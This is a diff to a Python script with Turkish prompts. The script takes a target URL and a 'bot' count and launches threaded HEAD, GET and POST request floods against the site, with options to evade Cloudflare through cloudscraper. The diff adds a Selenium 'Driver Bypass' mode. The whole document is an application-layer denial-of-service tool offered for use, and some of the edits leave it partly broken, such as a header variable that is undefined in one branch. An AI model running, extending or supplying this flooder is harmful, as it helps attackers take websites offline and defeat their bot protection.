@@ -2,6 +2,7 @@ import requests
 import threading
 import os
 import cloudscraper
+from selenium import webdriver
 os.system("clear")
 scraper = cloudscraper.create_scraper(
     browser={
@@ -12,14 +13,14 @@ scraper = cloudscraper.create_scraper(
 )
 url=input("Site Linki Giriniz: ")
 bot=int(input("Bot Sayı Girin: "))
-print("[1] HEAD\n[2] GET\n[3] POST\n[4] CLOUD BYPASS\n")
+print("[1] HEAD\n[2] GET\n[3] POST\n[4] CLOUD BYPASS\n[5] Driver Bypass\n")
 cf=str(input("Method Seçiniz: "))
 if cf =="2":
     def ch():
         he = { 'User-Agent': 'Mozilla/5.0', }
         for i in range(bot):
             try:
-                x = requests.get(url, headers=he)
+                x = requests.get(url, headers=he).text
             except:
                     pass
 elif cf =="1":
@@ -27,7 +28,7 @@ elif cf =="1":
         he = { 'User-Agent': 'Mozilla/5.0', }
         for i in range(bot):
             try:
-                x = requests.head(url ,headers=he)
+                x = requests.head(url ,headers=he).text
             except:
                     pass
 elif cf =="3":
@@ -35,7 +36,7 @@ elif cf =="3":
         he = { 'User-Agent': 'Mozilla/5.0', }
         for i in range(bot):
             try:
-                x = requests.post(url,headers=he)
+                x = requests.post(url,headers=he).text
             except:
                     pass
 elif cf =="4":
@@ -48,13 +49,20 @@ elif cf =="4":
         for i in range(bot):
             try:
                 if mt=="1":
-                    x = scraper.head(url,headers=hea)
+                    x = scraper.head(url,headers=he).text
                 elif mt=="2":
-                    x = scraper.get(url,headers=hea)
+                    x = scraper.get(url,headers=he).text
                 elif mt=="3":
-                    x = scraper.post(url,headers=hea)
+                    x = scraper.post(url,headers=he).text
             except:
                     pass
+if cf=="5":
+    driver = webdriver.Chrome(executable_path='./chromedriver')
+    for i in range(bot):
+        try:
+            driver.get(url)
+        except:
+            pass
 for i in range(bot):
     ta = threading.Thread(target=ch)
     ta.start()
